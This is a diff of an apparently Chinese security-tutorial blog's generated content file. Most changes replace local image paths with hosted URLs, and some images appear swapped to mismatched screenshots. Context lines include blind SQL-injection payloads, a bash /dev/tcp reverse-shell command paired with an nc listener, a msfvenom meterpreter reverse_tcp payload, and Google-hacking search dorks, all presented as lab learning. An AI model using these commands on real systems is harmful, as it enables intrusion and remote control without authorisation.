+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163128591.png" alt="1597163128591" title class>
                 <p>1597163128591</p>
             </figure>
 
@@ -2730,13 +2730,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;110#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597163275391.png" alt="1597163275391" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163675016.png" alt="1597163275391" title class>
                 <p>1597163275391</p>
             </figure>
 
 <p><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1),1,1)))&gt;109#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597163530646.png" alt="1597163530646" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597161459673.png" alt="1597163530646" title class>
                 <p>1597163530646</p>
             </figure>
 
@@ -2745,7 +2745,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (length(( select name from guestbook limit 0,1)))=4#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597163675016.png" alt="1597163675016" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163530646.png" alt="1597163675016" title class>
                 <p>1597163675016</p>
             </figure>
 
@@ -2760,7 +2760,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <p>最终猜到guestbook表中的name字段，第一个内容为test</p>
 </blockquote>
 <h5 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h5><figure class="image-box">
-                <img src="/img/sql注入/1597162058638.png" alt="1597162058638" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162058638.png" alt="1597162058638" title class>
                 <p>1597162058638</p>
             </figure>
 
@@ -2771,7 +2771,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <p>和前面一样的作用，只是为了防止自动化SQL注入</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/sql注入/1597162129663.png" alt="1597162129663" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162129663.png" alt="1597162129663" title class>
                 <p>1597162129663</p>
             </figure>
 
@@ -2816,7 +2816,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"urls"</span>:&#123;<span class="attr">"https://www.baidu.com/"</span>:&#123;<span class="attr">"status"</span>:<span class="number">200</span>&#125;&#125;,<span class="attr">"technologies"</span>:[&#123;<span class="attr">"slug"</span>:<span class="string">"swfobject"</span>,<span class="attr">"name"</span>:<span class="string">"SWFObject"</span>,<span class="attr">"confidence"</span>:<span class="number">100</span>,<span class="attr">"version"</span>:<span class="literal">null</span>,<span class="attr">"icon"</span>:<span class="string">"SWFObject.png"</span>,<span class="attr">"website"</span>:<span class="string">"https://github.com/swfobject/swfobject"</span>,<span class="attr">"cpe"</span>:<span class="literal">null</span>,<span class="attr">"categories"</span>:[&#123;<span class="attr">"id"</span>:<span class="number">19</span>,<span class="attr">"slug"</span>:<span class="string">"miscellaneous"</span>,<span class="attr">"name"</span>:<span class="string">"Miscellaneous"</span>&#125;]&#125;,&#123;<span class="attr">"slug"</span>:<span class="string">"jquery"</span>,<span class="attr">"name"</span>:<span class="string">"jQuery"</span>,<span class="attr">"confidence"</span>:<span class="number">100</span>,<span class="attr">"version"</span>:<span class="string">"1.10.2"</span>,<span class="attr">"icon"</span>:<span class="string">"jQuery.svg"</span>,<span class="attr">"website"</span>:<span class="string">"https://jquery.com"</span>,<span class="attr">"cpe"</span>:<span class="string">"cpe:/a:jquery:jquery"</span>,<span class="attr">"categories"</span>:[&#123;<span class="attr">"id"</span>:<span class="number">59</span>,<span class="attr">"slug"</span>:<span class="string">"javascript-libraries"</span>,<span class="attr">"name"</span>:<span class="string">"JavaScript libraries"</span>&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/wappalyzer/image-20210108224909184.png" alt="image-20210108224909184" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210110212723083.png" alt="image-20210108224909184" title class>
                 <p>image-20210108224909184</p>
             </figure>
 
@@ -3443,7 +3443,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </ul>
 <h3 id="指纹测试"><a href="#指纹测试" class="headerlink" title="指纹测试"></a>指纹测试</h3><p>我们写好规则后可以添加到<code>C:\Users\Administrator\AppData\Roaming\npm\node_modules</code>目录下的<code>technologies.json</code>文件中进行测试</p>
 <figure class="image-box">
-                <img src="/img/wappalyzer/image-20210110212616136.png" alt="image-20210110212616136" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210108224909184.png" alt="image-20210110212616136" title class>
                 <p>image-20210110212616136</p>
             </figure>
 
@@ -3452,7 +3452,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 
 <p>就可以看到返回结果</p>
 <figure class="image-box">
-                <img src="/img/wappalyzer/image-20210110212723083.png" alt="image-20210110212723083" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210110212616136.png" alt="image-20210110212723083" title class>
                 <p>image-20210110212723083</p>
             </figure>
 
@@ -3497,19 +3497,19 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>攻击机开启端口监听</span><br><span class="line">nc -lvp 9999</span><br><span class="line"><span class="meta">#</span>nc指的是netcat</span><br><span class="line"><span class="meta">#</span>-l 是listen监听的作用</span><br><span class="line"><span class="meta">#</span>-v 用于输出交互的信息</span><br><span class="line"><span class="meta">#</span>-p 用于监听指定端口</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/%E5%8F%8D%E5%BC%B9shell/1609514196672.png" alt="1609514196672" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514196672.png" alt="1609514196672" title class>
                 <p>1609514196672</p>
             </figure>
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>受害机执行反弹命令(自动连接监听的端口)</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span>bash -i 用于产生一个交互的shell</span><br><span class="line"><span class="meta">#</span>/dev/tcp/ip/port 作用相当于建立一个sockt连接</span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/%E5%8F%8D%E5%BC%B9shell/1609514612069.png" alt="1609514612069" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609518776337.png" alt="1609514612069" title class>
                 <p>1609514612069</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/%E5%8F%8D%E5%BC%B9shell/1609514726946.png" alt="1609514726946" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514726946.png" alt="1609514726946" title class>
                 <p>1609514726946</p>
             </figure>
 
@@ -3551,7 +3551,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.65.148 LPORT=9999 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
 
 <h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h3><figure class="image-box">
-                <img src="/img/%E5%8F%8D%E5%BC%B9shell/1609518776337.png" alt="1609518776337" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514612069.png" alt="1609518776337" title class>
                 <p>1609518776337</p>
             </figure>
 
@@ -7081,9 +7081,10 @@ $ docker build -t upload-labs</code></pre><p>或</p>
 site:域名 filetype:aspx
 site:域名 filetype:jsp
 site:域名 filetype:php</code></pre><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><figure class="image-box">
-                <img src="/img/gk.png" alt="Google-Hacking" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/gk.png" alt="Google-Hacking" title class>
                 <p>Google-Hacking</p>
             </figure>
+
 ]]></content>
       
         <categories>
